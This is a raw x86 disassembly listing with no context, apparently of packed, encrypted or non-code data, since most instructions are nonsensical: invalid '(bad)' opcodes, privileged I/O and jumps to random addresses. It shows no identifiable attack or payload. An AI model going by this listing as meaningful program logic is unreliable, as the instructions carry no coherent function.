  409d14:	cmp    ch,BYTE PTR ds:[eax]
  409d17:	push   ecx
  409d18:	mov    ds:0xcfdcfbb,eax
  409d1d:	add    dh,BYTE PTR [edi-0x54]
  409d20:	adc    al,BYTE PTR [ebx-0x63760c85]
  409d26:	(bad)  
  409d27:	aas    
  409d28:	test   eax,0x1b552d82
  409d2d:	in     al,dx
  409d2e:	call   0xa716:0x5fdcb184
  409d35:	cmp    BYTE PTR [edx],cl
  409d37:	xchg   esp,eax
  409d39:	int3   
  409d3a:	or     eax,0xb18870ad
  409d3f:	loope  0x409d09
  409d41:	jge    0x409d40
  409d43:	add    DWORD PTR [esi+0x76],ebp
  409d46:	dec    esp
  409d47:	sub    ebx,DWORD PTR [edx+0x2b77cd86]
  409d4d:	fild   QWORD PTR [eax-0x18]
  409d50:	mov    eax,0xec65e8ce
  409d55:	sar    bl,0xba
  409d58:	sbb    al,0xfe
  409d5a:	mov    eax,0x96b019c8
  409d5f:	push   edx
  409d60:	pusha  
  409d61:	dec    edx
  409d62:	int    0x55
  409d64:	aam    0xd3
  409d66:	dec    esp
  409d67:	fstp   QWORD PTR [ebx+0x26]
  409d6a:	push   esp
  409d6b:	imul   eax,DWORD PTR [esi-0x3d17cb08],0xef397fdf
  409d75:	jns    0x409cf7
  409d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d78:	xor    BYTE PTR [eax-0x71048f65],ah
  409d7e:	push   edx
  409d7f:	sub    al,0xb
  409d81:	lahf   
  409d82:	xor    DWORD PTR [ebx-0x3f],edi
  409d85:	mov    bh,0xec
  409d87:	or     eax,0x2eb558e7
  409d8c:	jmp    0x1da0756f
  409d91:	push   0xffffffd0
  409d93:	adc    DWORD PTR [eax+0x24],eax
  409d96:	cld    
  409d97:	(bad)  
  409d98:	into   
  409d99:	aad    0x82
  409d9b:	mov    ds:0xff57d32b,al
  409da0:	loope  0x409d22
  409da2:	inc    ecx
  409da3:	aas    
  409da4:	cdq    
  409da5:	mov    ss,WORD PTR gs:[edx+esi*1-0x47]
  409daa:	inc    esp
  409dab:	mov    dl,0xff
  409dad:	add    eax,0x36122a85
  409db2:	frstor [edx]
  409db4:	clc    
  409db5:	ret    0x63a7
  409db8:	adc    ax,0xd98d
  409dbc:	dec    ebx
  409dbd:	fwait
  409dbe:	inc    ebx
  409dbf:	std    
  409dc0:	push   eax
  409dc1:	daa    
  409dc2:	mov    DWORD PTR [eax],edx
  409dc4:	push   esp
  409dc5:	pop    esp
  409dc6:	cs rcl dl,cl
  409dc9:	loopne 0x409d57
  409dcb:	push   esi
  409dcc:	aas    
  409dcd:	push   ss
  409dce:	adc    ebx,DWORD PTR [edx-0x6716ecb1]
  409dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dd5:	test   cl,0xa9
  409dd8:	fisubr DWORD PTR [edi+0x59]
  409ddb:	test   al,0xed
  409ddd:	jecxz  0x409dc4
  409ddf:	pop    edi
  409de0:	(bad)  
  409de1:	call   0x70a38986
  409de6:	imul   esi,ebp,0xffffffa4
  409de9:	pop    ebp
  409dea:	add    eax,0x201aa4c5
  409def:	pop    ebx
  409df0:	adc    al,0x9a
  409df2:	int    0xe1
  409df4:	clc    
  409df5:	popa   
  409df6:	mov    bl,0xea
  409df8:	push   esp
  409df9:	cmp    bl,al
  409dfb:	lea    esi,[ecx+esi*1+0x1a090621]
  409e02:	js     0x409df0
  409e04:	(bad)  
  409e05:	adc    esp,eax
  409e07:	push   0x32722c8
  409e0c:	imul   ecx,edx,0x9e6c1d91
  409e12:	clc    
  409e13:	push   ds
  409e14:	and    DWORD PTR [ecx+0x5b992e1f],edi
  409e1a:	scas   al,BYTE PTR es:[edi]
  409e1b:	out    dx,al
  409e1c:	pop    esp
  409e1d:	sub    BYTE PTR [edx],al
  409e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e20:	fisttp DWORD PTR ds:0xad191e7c
  409e26:	test   BYTE PTR [ebx+0x58],dl
  409e29:	sub    ebp,ecx
  409e2b:	aad    0x3c
  409e2d:	mov    BYTE PTR ds:0x887b7087,cl
  409e33:	retf   0x2730
  409e36:	or     BYTE PTR [edi-0x5d],ah
  409e39:	aad    0xce
  409e3b:	mov    DWORD PTR [ebx+0x6],ebx
  409e3e:	div    DWORD PTR [ebx]
  409e40:	test   al,0x63
  409e42:	xlat   BYTE PTR ds:[ebx]
  409e43:	dec    edi
  409e44:	pop    edi
  409e45:	cli    
  409e46:	push   edx
  409e47:	stos   DWORD PTR es:[edi],eax
  409e48:	and    DWORD PTR [eax+0x75],edi
  409e4b:	mov    ebx,0xb0629e59
  409e50:	pop    eax
  409e51:	jbe    0x409dd3
  409e53:	js     0x409e2d
  409e55:	ds cmp dl,dl
  409e58:	push   0xedb44de4
  409e5d:	mul    BYTE PTR [edi+ebp*1]
  409e60:	jecxz  0x409de8
  409e62:	ja     0x409e61
  409e64:	pop    esi
  409e65:	ret    0xf1b8
  409e68:	les    ebx,FWORD PTR [ebp+0x75]
  409e6b:	jbe    0x409e88
  409e6d:	rol    DWORD PTR [ebx],cl
  409e6f:	push   edi
  409e70:	jo     0x409e4e
  409e72:	xchg   ebx,eax
  409e73:	aad    0xce
  409e75:	loope  0x409e8f
  409e77:	ja     0x409e72
  409e79:	mov    ebp,0xb9b720b4
  409e7e:	sub    DWORD PTR [edx+0x279df22],edi
  409e84:	sub    eax,0x536c870
  409e89:	test   ch,bl
  409e8b:	pop    edx
  409e8c:	adc    DWORD PTR [ecx+0x185d9b9],esp
  409e92:	add    bl,BYTE PTR [eax-0x207026f0]
  409e98:	jne    0x409e61
  409e9a:	dec    edx
  409e9b:	mul    DWORD PTR [edi+0x6568a8d1]
  409ea1:	inc    ebp
  409ea2:	jnp    0x409e82
  409ea4:	mov    DWORD PTR [esi],eax
  409ea6:	xor    DWORD PTR [edx+0x5d],0xffffffea
  409eaa:	cwde   
  409eab:	inc    ecx
  409eac:	stos   BYTE PTR es:[edi],al
  409ead:	out    0xd,eax
  409eaf:	(bad)  
  409eb0:	cld    
  409eb1:	dec    esi
  409eb2:	test   eax,0xb8791a92
  409eb7:	xor    DWORD PTR [ecx+0x69c5cbf0],0xffffffc7
  409ebe:	and    bl,BYTE PTR [ecx-0xff59cda]
  409ec4:	cmp    BYTE PTR [edx+0x147e8300],bl
  409eca:	inc    ebp
  409ecb:	retf   
  409ecc:	xor    eax,DWORD PTR [edx+esi*8]
  409ecf:	pop    edi
  409ed0:	xchg   edi,eax
  409ed1:	xchg   edi,eax
  409ed2:	imul   esi,DWORD PTR ds:0x3ea21979,0xe77e3614
  409edc:	xchg   ebp,eax
  409edd:	popa   
  409ede:	sbb    ebp,DWORD PTR [edi]
  409ee0:	test   edi,esi
  409ee2:	pusha  
  409ee3:	jl     0x409e69
  409ee5:	(bad)  
  409ee6:	mov    ecx,0xc0b0921d
  409eeb:	popf   
  409eec:	arpl   bx,cx
  409eee:	into   
  409eef:	pop    ss
  409ef0:	loop   0x409eca
  409ef2:	mov    eax,ds:0x887718c9
  409ef7:	cdq    
  409ef8:	add    al,0x7f
  409efa:	sbb    eax,0xedc93232
  409eff:	icebp  
  409f00:	nop
  409f01:	ror    cl,0x49
  409f04:	cld    
  409f05:	add    edi,esi
  409f07:	pop    es
  409f08:	cmp    dl,0x5d
  409f0b:	adc    BYTE PTR ds:0xa96b1384,bh
  409f11:	data16 ins BYTE PTR es:[edi],dx
  409f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f14:	mov    eax,ds:0xcaed3ba3
  409f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f1a:	test   eax,0xe7c24d84
  409f1f:	in     eax,0x79
  409f21:	out    0x15,eax
  409f23:	fmul   QWORD PTR [edx-0x1300e529]
  409f29:	clc    
  409f2a:	ss (bad) 
  409f2c:	push   esp
  409f2d:	lods   al,BYTE PTR ds:[esi]
  409f2e:	out    0x88,al
  409f30:	ds push ebx
  409f32:	push   0x35411593
  409f37:	sub    al,0x4e
  409f39:	push   esi
  409f3a:	sub    BYTE PTR [ebx],al
  409f3c:	addr16 in eax,0xb7
  409f3f:	pusha  
  409f40:	hlt    
  409f41:	inc    edi
  409f42:	inc    edi
  409f43:	jo     0x409f94
  409f45:	cmp    BYTE PTR [eax-0x76ae4ddb],bh
  409f4b:	adc    esp,DWORD PTR [edx+0x33f8b6ff]
  409f51:	mov    ecx,0x1dadf080
  409f56:	ins    DWORD PTR es:[edi],dx
  409f57:	sar    DWORD PTR [ecx],0x34
  409f5a:	mov    al,0x27
  409f5c:	pusha  
  409f5d:	int    0xf
  409f5f:	lahf   
  409f60:	arpl   WORD PTR [ebp+0x4d5692c1],di
  409f66:	add    BYTE PTR [ecx],bl
  409f68:	nop
  409f69:	jg     0x409ef5
  409f6b:	or     eax,0xd5b3bb98
  409f70:	jo     0x409f77
  409f72:	fidivr DWORD PTR [ebx+eiz*4-0x25]
  409f76:	ins    BYTE PTR es:[edi],dx
  409f77:	dec    eax
  409f78:	pop    ebp
  409f79:	add    DWORD PTR [edi-0x7a5f1732],esi
  409f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f80:	(bad)  
  409f81:	out    dx,al
  409f82:	jo     0x409fe9
  409f84:	les    esp,FWORD PTR [eax-0x46a5bfc9]
  409f8a:	xorps  xmm6,xmm1
  409f8d:	fsub   st(4),st
  409f8f:	rcl    DWORD PTR [eax+0x1e],0x22
  409f93:	xchg   edx,eax
  409f94:	push   eax
  409f95:	(bad)  
  409f96:	std    
  409f97:	aam    0x61
  409f99:	push   esp
  409f9a:	adc    eax,0x2f15fb25
  409fa0:	fwait
  409fa1:	sahf   
  409fa2:	(bad)  
  409fa3:	jmp    0x4e015364
  409fa8:	test   al,0xd3
  409faa:	shl    DWORD PTR [esi],cl
  409fac:	out    dx,eax
  409fad:	mov    ah,0xdd
  409faf:	xchg   ebp,eax
  409fb0:	sub    esp,edi
  409fb2:	scas   al,BYTE PTR es:[edi]
  409fb3:	ds inc esi
  409fb5:	xor    cl,bh
  409fb7:	inc    esp
  409fb8:	mov    dl,0xca
  409fba:	jo     0x409f43
  409fbc:	inc    dh
  409fbe:	push   ss
  409fbf:	fbstp  TBYTE PTR [edi+0x76]
  409fc2:	xchg   edx,eax
  409fc3:	jno    0x409f8a
  409fc5:	xchg   edx,eax
  409fc6:	hlt    
  409fc7:	pop    esp
  409fc8:	pop    edx
  409fc9:	pop    ds
  409fca:	pop    esp
  409fcb:	adc    DWORD PTR [ecx-0x42],ebx
  409fce:	iret   
  409fcf:	aaa    
  409fd0:	sub    BYTE PTR [esi+ecx*8-0x19],bh
  409fd4:	int    0x89
  409fd6:	sbb    DWORD PTR [eax-0x77],ecx
  409fd9:	inc    ebx
  409fda:	call   0xdb108d73
  409fdf:	lea    esp,[ebp-0x56]
  409fe2:	shr    dl,1
  409fe4:	push   ss
  409fe5:	cld    
  409fe6:	jb     0x40a03a
  409fe8:	scas   eax,DWORD PTR es:[edi]
  409fe9:	xchg   ecx,eax
  409fea:	adc    al,BYTE PTR [edi+0x78]
  409fed:	fmul   DWORD PTR [ebp-0x27dfa8e3]
  409ff3:	(bad)
  409ff6:	mov    esi,0x1aab6d7b
  409ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ffc:	mov    DWORD PTR [esi-0x4bf4acbf],esi
  40a002:	(bad)  
  40a003:	fs sbb ebp,edx
  40a006:	(bad)  
  40a007:	jle    0x409fc8
  40a009:	adc    esp,DWORD PTR [edi]
  40a00b:	iret   
  40a00c:	rcr    DWORD PTR [ecx-0x1da7c1d],0xe6
  40a013:	lock or esi,ecx
  40a016:	loop   0x40a082
  40a018:	inc    eax
  40a019:	xor    edx,edx
  40a01b:	fidivr WORD PTR [ebx+0x19b41363]
  40a021:	in     al,0xc5
  40a023:	daa    
  40a024:	cmp    DWORD PTR [eax+ebx*2],edi
  40a027:	or     al,0x6f
  40a029:	retf   
  40a02a:	sti    
  40a02b:	jmp    0xf18c:0xc8bfd760
  40a032:	das    
  40a033:	fbstp  TBYTE PTR [esi]
  40a035:	pop    edx
  40a036:	rcl    esp,1
  40a038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a039:	rcl    BYTE PTR [eax],1
  40a03b:	pop    ebx
  40a03c:	push   cs
  40a03d:	sub    ebp,DWORD PTR [edi+0x7a]
  40a040:	cmp    al,0x96
  40a042:	dec    edi
  40a043:	lock (bad) 
  40a046:	std    
  40a047:	scas   eax,DWORD PTR es:[edi]
  40a048:	xchg   esp,eax
  40a049:	mov    ah,ch
  40a04b:	nop
  40a04c:	jecxz  0x40a02d
  40a04e:	lods   al,BYTE PTR ds:[esi]
  40a04f:	js     0x409fe9
  40a051:	mov    bl,BYTE PTR es:[eax+edi*2+0x2c]
  40a056:	ins    BYTE PTR es:[edi],dx
  40a057:	call   FWORD PTR [ebx+0x74deefc6]
  40a05d:	and    edx,DWORD PTR [ebp-0x20c05135]
  40a063:	repnz lahf 
  40a065:	adc    al,0x12
  40a067:	add    ch,BYTE PTR [ecx-0x76]
  40a06a:	scas   al,BYTE PTR es:[edi]
  40a06b:	jns    0x40a002
  40a06d:	jecxz  0x40a013
  40a06f:	push   ecx
  40a070:	or     ebx,DWORD PTR ds:0xa82108cc
  40a076:	mov    esi,DWORD PTR [edx+0x777c0d18]
  40a07c:	and    esi,DWORD PTR [esp+eax*8+0x27ad7c9b]
  40a083:	adc    BYTE PTR [esp+eax*2-0x70d2b9a9],ah
  40a08a:	sub    eax,0x5c9b714b
  40a08f:	nop
  40a090:	leave  
  40a091:	rcr    BYTE PTR [ebp+0x14ea3bcb],1
  40a097:	jmp    0x299830b2
  40a09c:	sbb    BYTE PTR [edi-0x47dded8c],cl
  40a0a2:	inc    esi
  40a0a3:	je     0x40a0fb
  40a0a5:	dec    ebx
  40a0a6:	or     bl,ah
  40a0a8:	xchg   BYTE PTR [edi+0x1d],bl
  40a0ab:	inc    ebx
  40a0ac:	outs   dx,BYTE PTR ds:[esi]
  40a0ad:	ds jne 0x40a05d
  40a0b0:	pushf  
  40a0b1:	or     DWORD PTR [edi-0x58fe75eb],edx
  40a0b7:	mov    eax,0x17e035f6
  40a0bc:	or     BYTE PTR [eax+ebx*1-0x2],ch
  40a0c0:	repz push ds
  40a0c2:	and    BYTE PTR [edi],ch
  40a0c4:	fisttp WORD PTR [ebx]
  40a0c6:	xor    BYTE PTR [esi-0x26],dl
  40a0c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ca:	shl    bh,0x5
  40a0cd:	mov    eax,0x151907d9
  40a0d2:	fs inc ebx
  40a0d4:	imul   edx,ebp,0xffffff95
  40a0d7:	test   eax,0xae5531c8
  40a0dc:	or     dh,BYTE PTR [ebp+0x53]
  40a0df:	sbb    esi,ebp
  40a0e1:	fbstp  TBYTE PTR ds:0xcbb98c01
  40a0e7:	or     ebp,ebp
  40a0e9:	push   edx
  40a0ea:	popa   
  40a0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ec:	aaa    
  40a0ed:	cmp    BYTE PTR ds:0xa559cf8,bl
  40a0f3:	mov    ds:0xb365a206,al
  40a0f8:	sahf   
  40a0f9:	sahf   
  40a0fa:	xchg   ebp,eax
  40a0fc:	mov    esi,cs
  40a0fe:	and    BYTE PTR [esi],cl
  40a100:	mov    dl,BYTE PTR [eax]
  40a102:	repnz cmp BYTE PTR [ecx-0x26b94b0e],cl
  40a109:	iret   
  40a10a:	mov    esp,0x37d55f58
  40a10f:	and    eax,0xf00251ad
  40a114:	sub    BYTE PTR [ebx+0x3d88c5ce],ch
  40a11a:	xor    DWORD PTR [ebp+0x1c],0xe115fede
  40a121:	idiv   DWORD PTR [ebx]
  40a123:	and    BYTE PTR [edi-0x4b],ah
  40a126:	and    BYTE PTR [ebx],al
  40a128:	jecxz  0x40a0e4
  40a12a:	imul   DWORD PTR [ebx-0x6711f383]
  40a130:	push   ebp
  40a131:	cmp    BYTE PTR [ebx],cl
  40a133:	clc    
  40a134:	stos   BYTE PTR es:[edi],al
  40a135:	cmp    al,dh
  40a137:	lock inc ebp
  40a139:	sub    dh,ah
  40a13b:	push   esi
  40a13c:	mov    eax,DWORD PTR [esi-0x64]
  40a13f:	pop    es
  40a140:	or     cl,cl
  40a142:	adc    BYTE PTR [ebp+0xd],ch
  40a145:	mov    BYTE PTR [eax],dh
  40a147:	mov    BYTE PTR [edi],al
  40a149:	jge    0x40a15b
  40a14b:	pusha  
  40a14c:	or     dh,cl
  40a14e:	call   0x6183:0xea8f358d
  40a155:	xchg   ebp,eax
  40a156:	pop    es
  40a157:	ins    DWORD PTR es:[edi],dx
  40a158:	push   ds
  40a159:	mov    esp,0x3dbe7ffe
  40a15e:	ss and eax,0x4a41a77f
  40a164:	cmp    DWORD PTR [edx+0x52b6dc89],ebp
  40a16a:	inc    ecx
  40a16b:	inc    edi
  40a16c:	sub    BYTE PTR [edi-0x41],0x76
  40a170:	adc    al,0xfa
  40a172:	aas    
  40a173:	aaa    
  40a174:	xor    DWORD PTR [edi+0x4c065e4e],ecx
  40a17a:	jmp    0xeb9912b2
  40a17f:	into   
  40a180:	cmp    BYTE PTR [ebx+0x543410d8],0x33
  40a187:	inc    esp
  40a188:	mov    DWORD PTR [eax],0x643953e2
  40a18e:	xchg   ebp,eax
  40a18f:	mov    eax,0x7218299a
  40a194:	cdq    
  40a195:	jbe    0x40a1a2
  40a197:	push   edi
  40a198:	icebp  
  40a199:	xchg   edi,eax
  40a19a:	loop   0x40a145
  40a19c:	adc    al,0x96
  40a19e:	shl    DWORD PTR gs:[eax-0x65a29a38],1
  40a1a5:	jno    0x40a1c6
  40a1a7:	mov    BYTE PTR [eax+edi*4+0x15d86ea8],bh
  40a1ae:	(bad)  
  40a1af:	cmc    
  40a1b0:	push   eax
  40a1b1:	out    dx,eax
  40a1b2:	jns    0x40a147
  40a1b4:	adc    eax,0x5a1b18fd
  40a1b9:	cmc    
  40a1ba:	jno    0x40a180
  40a1bc:	or     BYTE PTR [ebp+0x96e1559],0x59
  40a1c3:	repnz aas 
  40a1c5:	pop    es
  40a1c6:	bound  eax,QWORD PTR [ecx-0x6308dac9]
  40a1cc:	scas   eax,DWORD PTR es:[edi]
  40a1cd:	stc    
  40a1ce:	sub    BYTE PTR [ecx+0x4f9f1706],ch
  40a1d4:	aas    
  40a1d5:	in     al,0x3d
  40a1d7:	sbb    ecx,ebx
  40a1d9:	leave  
  40a1da:	inc    ebp
  40a1db:	jo     0x40a1cd
  40a1dd:	hlt    
  40a1de:	jnp    0x40a24e
  40a1e0:	outs   dx,DWORD PTR ds:[esi]
  40a1e1:	neg    cl
  40a1e3:	icebp  
  40a1e4:	dec    ebp
  40a1e5:	jbe    0x40a1c0
  40a1e7:	inc    eax
  40a1e8:	push   edi
  40a1e9:	jnp    0x40a245
  40a1eb:	sub    ebp,DWORD PTR [ebx+0xefb51f7]
  40a1f1:	fist   WORD PTR [edi+0x7c]
  40a1f4:	push   es
  40a1f5:	imul   edx,eax,0xfffffffb
  40a1f8:	js     0x40a237
  40a1fa:	int    0xf0
  40a1fc:	push   0x16
  40a1fe:	sub    al,0xad
  40a200:	lock adc al,0x2e
  40a203:	dec    edi
  40a204:	inc    ebx
  40a205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a206:	jecxz  0x40a26a
  40a208:	add    BYTE PTR [esi],dl
  40a20a:	pop    ds
  40a20b:	repz iret 
  40a20d:	rcr    DWORD PTR [esp+eax*4+0x1c],1
  40a211:	es repnz arpl di,dx
  40a215:	mov    eax,DWORD PTR [eax]
  40a217:	sub    eax,0x3487fdb5
  40a21c:	cld    
  40a21d:	dec    ebp
  40a21e:	ins    BYTE PTR es:[edi],dx
  40a21f:	pop    ebp
  40a220:	adc    BYTE PTR [ecx],0x5d
  40a223:	xchg   edx,eax
  40a224:	jg     0x40a1f3
  40a226:	retf   
  40a227:	repnz test BYTE PTR [edx],dh
  40a22a:	xor    bl,dl
  40a22c:	dec    ebp
  40a22d:	mov    esp,ebx
  40a22f:	jp     0x40a29d
  40a231:	inc    edi
  40a232:	mov    ecx,DWORD PTR [esi]
  40a234:	dec    eax
  40a235:	es add al,0x88
  40a238:	repz mov eax,0x1896c455
  40a23e:	mov    dh,BYTE PTR [ebp-0x1]
  40a241:	mov    cl,0x70
  40a243:	pop    edi
  40a244:	push   cs
  40a245:	ficom  WORD PTR [edx+0x27]
  40a248:	push   ds
  40a249:	aad    0x5f
  40a24b:	sub    eax,0xdd932a36
  40a250:	das    
  40a251:	push   ds
  40a252:	dec    esp
  40a253:	mov    bl,0x30
  40a255:	fs lahf 
  40a257:	loopne 0x40a29f
  40a259:	xchg   DWORD PTR [eax+0x65],esp
  40a25c:	dec    edi
  40a25d:	jecxz  0x40a2d8
  40a25f:	dec    esp
  40a260:	mov    ebx,0x888e1b4
  40a265:	ins    DWORD PTR es:[edi],dx
  40a266:	xchg   DWORD PTR [esi+0x63],ecx
  40a269:	in     eax,0x69
  40a26b:	pushf  
  40a26c:	bound  edi,QWORD PTR ds:0xdf4743fd
  40a272:	adc    esi,DWORD PTR [ebx+0x65]
  40a275:	adc    ch,BYTE PTR [eax-0x51]
  40a278:	loop   0x40a2bd
  40a27a:	aaa    
  40a27b:	fisttp DWORD PTR [edi]
  40a27d:	in     eax,dx
  40a27e:	aaa    
  40a27f:	ins    BYTE PTR es:[edi],dx
  40a280:	sbb    bl,cl
  40a282:	repnz lahf 
  40a284:	push   ds
  40a285:	in     al,dx
  40a286:	cmp    BYTE PTR [ebx],0x2c
  40a289:	add    al,dh
  40a28b:	aas    
  40a28c:	in     eax,0xd1
  40a28e:	sub    edi,edx
  40a290:	stos   BYTE PTR es:[edi],al
  40a291:	shr    DWORD PTR [edx],1
  40a293:	cli    
  40a294:	repz leave 
  40a296:	xlat   BYTE PTR ds:[ebx]
  40a297:	bnd jmp 0x40a239
  40a29a:	mov    bh,0xc8
  40a29c:	or     bh,BYTE PTR [esp+eax*4+0xfbf93d6]
  40a2a3:	pushf  
  40a2a4:	xchg   esp,eax
  40a2a5:	mov    dl,0xc7
  40a2a7:	pop    esp
  40a2a8:	push   ds
  40a2a9:	hlt    
  40a2aa:	adc    ebx,DWORD PTR [edx]
  40a2ac:	pop    ebx
  40a2ad:	jle    0x40a329
  40a2af:	lock iret 
  40a2b1:	lods   al,BYTE PTR ds:[esi]
  40a2b2:	jnp    0x40a2de
  40a2b4:	sbb    eax,edx
  40a2b6:	or     dh,BYTE PTR [esi-0x4a]
  40a2b9:	jb     0x40a2b2
  40a2bb:	push   0x434052d
  40a2c0:	mov    ah,0xe1
  40a2c2:	sub    ah,al
  40a2c4:	mov    al,0x56
  40a2c6:	inc    edi
  40a2c7:	jg     0x40a26c
  40a2c9:	jno    0x40a2d9
  40a2cb:	jae    0x40a31c
  40a2cd:	cmp    BYTE PTR [ebx-0x50bc9d1a],0xcc
  40a2d4:	dec    edi
  40a2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2d6:	sub    dh,BYTE PTR [edx]
  40a2d8:	sbb    esi,ebp
  40a2da:	jns    0x40a320
  40a2dc:	addr16 dec eax
  40a2de:	imul   ebx,ecx,0xffffff85
  40a2e1:	jbe    0x40a2b7
  40a2e3:	scas   al,BYTE PTR es:[edi]
  40a2e4:	retf   
  40a2e5:	mov    ds:0x58ca3036,al
  40a2ea:	aam    0xb2
  40a2ec:	mov    ecx,DWORD PTR [ebx]
  40a2ee:	int3   
  40a2ef:	sbb    BYTE PTR ds:0xa5743050,0xc4
  40a2f6:	test   DWORD PTR es:[edx-0x37fdabc1],ebx
  40a2fd:	out    0xc0,eax
  40a2ff:	out    dx,eax
  40a300:	scas   al,BYTE PTR es:[edi]
  40a301:	or     DWORD PTR [eax+0x7eb35af1],esi
  40a307:	(bad)  
  40a308:	mov    ds:0x89b72418,al
  40a30d:	or     eax,0x429c66f7
  40a312:	xchg   BYTE PTR [ebp*2+0x2320c0ed],al
  40a319:	xchg   ebp,eax
  40a31a:	jl     0x40a310
  40a31c:	mov    dl,0x7d
  40a31e:	mov    dh,0xb1
  40a320:	xchg   esi,eax
  40a321:	js     0x40a2d6
  40a323:	cmc    
  40a324:	pop    ss
  40a325:	ja     0x40a366
  40a327:	repnz out dx,eax
  40a329:	sahf   
  40a32a:	ret    
  40a32b:	jl     0x40a350
  40a32d:	xor    bh,BYTE PTR [esi+eax*2+0x5b]
  40a331:	mov    bl,BYTE PTR [ecx-0x58]
  40a334:	or     eax,0xa624ff40
  40a339:	dec    ebx
  40a33a:	xor    cl,BYTE PTR [eax]
  40a33c:	dec    ebp
  40a33d:	xor    al,0x6c
  40a33f:	jae    0x40a3a4
  40a341:	push   edi
  40a342:	pop    ss
  40a343:	jecxz  0x40a311
  40a345:	aad    0xed
  40a347:	inc    edi
  40a348:	leave  
  40a349:	pop    esp
  40a34a:	fwait
  40a34b:	xlat   BYTE PTR ds:[ebx]
  40a34c:	mov    DWORD PTR [ecx-0x1d],ebp
  40a34f:	inc    esi
  40a350:	mov    dl,0xf2
  40a352:	addr16 inc ebx
  40a354:	pop    ebx
  40a355:	dec    esi
  40a356:	es mov dh,0x32
  40a359:	jl     0x40a3a7
  40a35b:	loope  0x40a30a
  40a35d:	std    
  40a35e:	cmp    BYTE PTR [eax-0x4cecc5af],0xb4
  40a365:	adc    dl,cl
  40a367:	outs   dx,BYTE PTR ds:[esi]
  40a368:	mov    ecx,0x75d560ef
  40a36d:	aad    0x7e
  40a36f:	or     ecx,DWORD PTR [esi+eiz*1-0x33]
  40a373:	sahf   
  40a374:	push   cs
  40a375:	xor    eax,0xf076076
  40a37a:	cli    
  40a37b:	inc    esi
  40a37c:	dec    edx
  40a37d:	sar    ebp,cl
  40a37f:	les    edi,FWORD PTR [edi-0x5]
  40a382:	xchg   BYTE PTR [ecx+eiz*4+0x35],al
  40a386:	loopne 0x40a395
  40a388:	pushf  
  40a389:	lea    ecx,[esi-0x7a]
  40a38c:	div    ecx
  40a38e:	aaa    
  40a38f:	jne    0x40a334
  40a391:	pop    ecx
  40a392:	and    BYTE PTR [edi+eiz*1-0x254bfd5c],bl
  40a399:	add    DWORD PTR [ebx+0x4446df1a],eax
  40a39f:	cmp    al,BYTE PTR ds:0x83dd6f7
  40a3a5:	pusha  
  40a3a6:	data16 daa 
  40a3a8:	repnz in eax,dx
  40a3aa:	lds    ecx,FWORD PTR [ebx-0x5af33f0b]
  40a3b0:	xchg   edi,eax
  40a3b1:	jle    0x40a354
  40a3b3:	(bad)  
  40a3b4:	ja     0x40a3ec
  40a3b6:	cmp    dl,BYTE PTR [edi]
  40a3b8:	loop   0x40a40d
  40a3ba:	mov    ebx,0xebb3482
  40a3bf:	cmp    DWORD PTR [edx-0x3],eax
  40a3c2:	daa    
  40a3c3:	scas   al,BYTE PTR es:[edi]
  40a3c4:	lea    ecx,[edi+0x8]
  40a3c7:	es push edx
  40a3c9:	inc    ecx
  40a3ca:	mov    ds:0xbeb96217,eax
  40a3cf:	shl    DWORD PTR [edi-0x1a],cl
  40a3d2:	(bad)  
  40a3d3:	jnp    0x40a445
  40a3d5:	adc    al,BYTE PTR [ebx]
  40a3d7:	xchg   DWORD PTR [ebx-0x52],ecx
  40a3da:	in     al,0xb5
  40a3dc:	arpl   WORD PTR [edx-0x11],dx
  40a3df:	add    BYTE PTR [eax-0x6c],bl
  40a3e2:	cmp    bh,BYTE PTR [eax+0x392eb70b]
  40a3e8:	loope  0x40a428
  40a3ea:	pop    ds
  40a3eb:	ret    0x6b22
  40a3ee:	iret   
  40a3ef:	mov    esi,0x4909a009
  40a3f4:	vmread DWORD PTR [ecx+ecx*1],ebp
  40a3f8:	fbld   TBYTE PTR [eax+0x51941ca8]
  40a3fe:	(bad)  
  40a3ff:	(bad)  
  40a400:	test   DWORD PTR [ebx+0x5],0x8962fab2
  40a407:	test   eax,0x5ebcf295
  40a40c:	push   cs
  40a40d:	add    esi,ecx
  40a40f:	jecxz  0x40a3a6
  40a411:	test   eax,0x2760017f
  40a416:	mov    dl,0xda
  40a418:	arpl   WORD PTR [esi],bx
  40a41a:	test   BYTE PTR [esp+edx*2+0x281c98db],dl
  40a421:	sbb    DWORD PTR [edx+0xff230ed],edx
  40a427:	dec    eax
  40a428:	jp     0x40a44e
  40a42a:	js     0x40a411
  40a42c:	push   0xffffffbb
  40a42e:	add    edi,DWORD PTR [edi-0x1d668ee6]
  40a434:	cld    
  40a435:	fbld   TBYTE PTR [edx+eiz*4+0x5]
  40a439:	popf   
  40a43a:	dec    edx
  40a43b:	pop    esi
  40a43c:	xchg   esi,eax
  40a43d:	add    BYTE PTR [ebx-0x279952c9],bl
  40a443:	mov    eax,ds:0x5ed87a35
  40a448:	lahf   
  40a449:	xchg   ebp,eax
  40a44a:	or     esi,ecx
  40a44c:	sub    DWORD PTR [ebx],eax
  40a44e:	(bad)  
  40a44f:	aam    0x7a
  40a451:	jns    0x40a4cd
  40a453:	mov    WORD PTR [esi+0x10],si
  40a457:	fdivp  st(2),st
  40a459:	div    DWORD PTR [edx]
  40a45b:	push   es
  40a45c:	add    dh,BYTE PTR [ebp+0x7c20e3bb]
  40a462:	std    
  40a463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a464:	sbb    BYTE PTR [ebp-0x1a8f3325],ch
  40a46a:	jle    0x40a4ea
  40a46c:	outs   dx,BYTE PTR ds:[esi]
  40a46d:	inc    ecx
  40a46e:	push   ebx
  40a46f:	dec    esp
  40a470:	bound  ebx,QWORD PTR [edi-0x50]
  40a473:	int    0xf3
  40a475:	adc    eax,0x3ad2c4f9
  40a47a:	and    al,cl
